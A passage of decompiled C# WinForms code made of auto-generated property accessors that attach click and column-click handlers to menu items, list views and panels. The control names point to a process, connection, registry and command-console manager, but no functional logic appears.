		{
			return _RefreshToolStripMenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem3_Click;
			if (_RefreshToolStripMenuItem3 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem3).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem3 = value;
			if (_RefreshToolStripMenuItem3 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem3).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem StartToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _StartToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StartToolStripMenuItem_Click;
			if (_StartToolStripMenuItem != null)
			{
				((ToolStripItem)_StartToolStripMenuItem).remove_Click(eventHandler);
			}
			_StartToolStripMenuItem = value;
			if (_StartToolStripMenuItem != null)
			{
				((ToolStripItem)_StartToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem PauseToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _PauseToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PauseToolStripMenuItem_Click;
			if (_PauseToolStripMenuItem != null)
			{
				((ToolStripItem)_PauseToolStripMenuItem).remove_Click(eventHandler);
			}
			_PauseToolStripMenuItem = value;
			if (_PauseToolStripMenuItem != null)
			{
				((ToolStripItem)_PauseToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem PauseToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PauseToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PauseToolStripMenuItem1_Click;
			if (_PauseToolStripMenuItem1 != null)
			{
				((ToolStripItem)_PauseToolStripMenuItem1).remove_Click(eventHandler);
			}
			_PauseToolStripMenuItem1 = value;
			if (_PauseToolStripMenuItem1 != null)
			{
				((ToolStripItem)_PauseToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RestartToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RestartToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RestartToolStripMenuItem_Click;
			if (_RestartToolStripMenuItem != null)
			{
				((ToolStripItem)_RestartToolStripMenuItem).remove_Click(eventHandler);
			}
			_RestartToolStripMenuItem = value;
			if (_RestartToolStripMenuItem != null)
			{
				((ToolStripItem)_RestartToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshServiceToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshServiceToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshServiceToolStripMenuItem_Click;
			if (_RefreshServiceToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshServiceToolStripMenuItem).remove_Click(eventHandler);
			}
			_RefreshServiceToolStripMenuItem = value;
			if (_RefreshServiceToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshServiceToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem4_Click;
			if (_RefreshToolStripMenuItem4 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem4).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem4 = value;
			if (_RefreshToolStripMenuItem4 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem4).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem KillDeleteToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _KillDeleteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = KillDeleteToolStripMenuItem_Click;
			if (_KillDeleteToolStripMenuItem != null)
			{
				((ToolStripItem)_KillDeleteToolStripMenuItem).remove_Click(eventHandler);
			}
			_KillDeleteToolStripMenuItem = value;
			if (_KillDeleteToolStripMenuItem != null)
			{
				((ToolStripItem)_KillDeleteToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem KillProcessToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _KillProcessToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = KillProcessToolStripMenuItem_Click;
			if (_KillProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_KillProcessToolStripMenuItem).remove_Click(eventHandler);
			}
			_KillProcessToolStripMenuItem = value;
			if (_KillProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_KillProcessToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RestartProcessToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RestartProcessToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RestartProcessToolStripMenuItem_Click;
			if (_RestartProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_RestartProcessToolStripMenuItem).remove_Click(eventHandler);
			}
			_RestartProcessToolStripMenuItem = value;
			if (_RestartProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_RestartProcessToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem SuspendProcessToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _SuspendProcessToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SuspendProcessToolStripMenuItem_Click;
			if (_SuspendProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_SuspendProcessToolStripMenuItem).remove_Click(eventHandler);
			}
			_SuspendProcessToolStripMenuItem = value;
			if (_SuspendProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_SuspendProcessToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ResumeProcessToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ResumeProcessToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ResumeProcessToolStripMenuItem_Click;
			if (_ResumeProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_ResumeProcessToolStripMenuItem).remove_Click(eventHandler);
			}
			_ResumeProcessToolStripMenuItem = value;
			if (_ResumeProcessToolStripMenuItem != null)
			{
				((ToolStripItem)_ResumeProcessToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem5
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem5_Click;
			if (_RefreshToolStripMenuItem5 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem5).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem5 = value;
			if (_RefreshToolStripMenuItem5 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem5).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem KillConnectionToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _KillConnectionToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = KillConnectionToolStripMenuItem_Click;
			if (_KillConnectionToolStripMenuItem != null)
			{
				((ToolStripItem)_KillConnectionToolStripMenuItem).remove_Click(eventHandler);
			}
			_KillConnectionToolStripMenuItem = value;
			if (_KillConnectionToolStripMenuItem != null)
			{
				((ToolStripItem)_KillConnectionToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem6
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem6_Click;
			if (_RefreshToolStripMenuItem6 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem6).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem6 = value;
			if (_RefreshToolStripMenuItem6 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem6).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RemoveToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoveToolStripMenuItem_Click;
			if (_RemoveToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem).remove_Click(eventHandler);
			}
			_RemoveToolStripMenuItem = value;
			if (_RemoveToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ListView Processlists
	{
		[DebuggerNonUserCode]
		get
		{
			return _Processlists;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			EventHandler eventHandler = Processlists_SelectedIndexChanged;
			ColumnClickEventHandler val = new ColumnClickEventHandler(Processlists_ColumnClick);
			if (_Processlists != null)
			{
				_Processlists.remove_SelectedIndexChanged(eventHandler);
				_Processlists.remove_ColumnClick(val);
			}
			_Processlists = value;
			if (_Processlists != null)
			{
				_Processlists.add_SelectedIndexChanged(eventHandler);
				_Processlists.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader5 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader7 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader9
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader9 = value;
		}
	}

	internal virtual ListView SM
	{
		[DebuggerNonUserCode]
		get
		{
			return _SM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(SM_ColumnClick);
			if (_SM != null)
			{
				_SM.remove_ColumnClick(val);
			}
			_SM = value;
			if (_SM != null)
			{
				_SM.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader10
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader10 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader11
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader11 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader12
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader12 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader13
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader13 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader14
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader14 = value;
		}
	}

	internal virtual ListView TCPC
	{
		[DebuggerNonUserCode]
		get
		{
			return _TCPC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(TCPC_ColumnClick);
			if (_TCPC != null)
			{
				_TCPC.remove_ColumnClick(val);
			}
			_TCPC = value;
			if (_TCPC != null)
			{
				_TCPC.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader15
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader15 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader16
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader16 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader17
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader17 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader18
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader18 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader19
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader19 = value;
		}
	}

	internal virtual ListView PIIT
	{
		[DebuggerNonUserCode]
		get
		{
			return _PIIT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PIIT = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader20
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader20 = value;
		}
	}

	internal virtual TextBox Commands
	{
		[DebuggerNonUserCode]
		get
		{
			return _Commands;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(Commands_KeyDown);
			if (_Commands != null)
			{
				((Control)_Commands).remove_KeyDown(val);
			}
			_Commands = value;
			if (_Commands != null)
			{
				((Control)_Commands).add_KeyDown(val);
			}
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual TextBox ResultCMD
	{
		[DebuggerNonUserCode]
		get
		{
			return _ResultCMD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ResultCMD = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual MenuStrip MenuStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _MenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem StartToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StartToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StartToolStripMenuItem1_Click;
			if (_StartToolStripMenuItem1 != null)
			{
				((ToolStripItem)_StartToolStripMenuItem1).remove_Click(eventHandler);
			}
			_StartToolStripMenuItem1 = value;
			if (_StartToolStripMenuItem1 != null)
			{
				((ToolStripItem)_StartToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel9
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel9 = value;
		}
	}

	internal virtual StatusStrip StatusStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip2 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel6 = value;
		}
	}

	internal virtual StatusStrip StatusStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip3 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel3 = value;
		}
	}

	internal virtual StatusStrip StatusStrip4
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip4 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel5 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel8 = value;
		}
	}

	internal virtual StatusStrip StatusStrip5
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip5 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel2 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel4 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual ComboBox RegValues
	{
		[DebuggerNonUserCode]
		get
		{
			return _RegValues;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RegValues_SelectedIndexChanged;
			if (_RegValues != null)
			{
				_RegValues.remove_SelectedIndexChanged(eventHandler);
			}
			_RegValues = value;
			if (_RegValues != null)
			{
				_RegValues.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual Label RegPath
	{
		[DebuggerNonUserCode]
		get
		{
			return _RegPath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RegPath = value;
		}
	}

	internal virtual ListView ValuesRegName
	{
		[DebuggerNonUserCode]
		get
		{
			return _ValuesRegName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(ValuesRegName_ColumnClick);
			EventHandler eventHandler = ValuesRegName_DoubleClick;
			if (_ValuesRegName != null)
			{
				_ValuesRegName.remove_ColumnClick(val);
				((Control)_ValuesRegName).remove_DoubleClick(eventHandler);
			}
			_ValuesRegName = value;
			if (_ValuesRegName != null)
			{
				_ValuesRegName.add_ColumnClick(val);
				((Control)_ValuesRegName).add_DoubleClick(eventHandler);
			}
		}
	}

	internal virtual ListView KeysName
	{
		[DebuggerNonUserCode]
		get
		{
			return _KeysName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			EventHandler eventHandler = KeysName_DoubleClick;
			ColumnClickEventHandler val = new ColumnClickEventHandler(KeysName_ColumnClick);
			if (_KeysName != null)
			{
				((Control)_KeysName).remove_DoubleClick(eventHandler);
				_KeysName.remove_ColumnClick(val);
			}
			_KeysName = value;
			if (_KeysName != null)
			{
				((Control)_KeysName).add_DoubleClick(eventHandler);
				_KeysName.add_ColumnClick(val);
			}
		}
	}

	internal virtual StatusStrip StatusStrip6
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip6 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel7 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader22
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader22 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader23
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader23 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader24
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader24 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader21
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader21 = value;
		}
	}

	internal virtual MenuStrip MenuStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _MenuStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_MenuStrip2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader25
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader25 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader26
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader26 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader27
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader27;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader27 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader28
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader28;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader28 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader29
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader29;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader29 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader30
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader30;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader30 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader31
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader31;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader31 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader32
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader32;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader32 = value;
		}
	}

	internal virtual ImageList ImageList2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList2 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Panel Panel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel5 = value;
		}
	}

	internal virtual Panel Panel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel4 = value;
		}
	}

	internal virtual ToolStripMenuItem CopyPathToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _CopyPathToolStripMenuItem;
		}
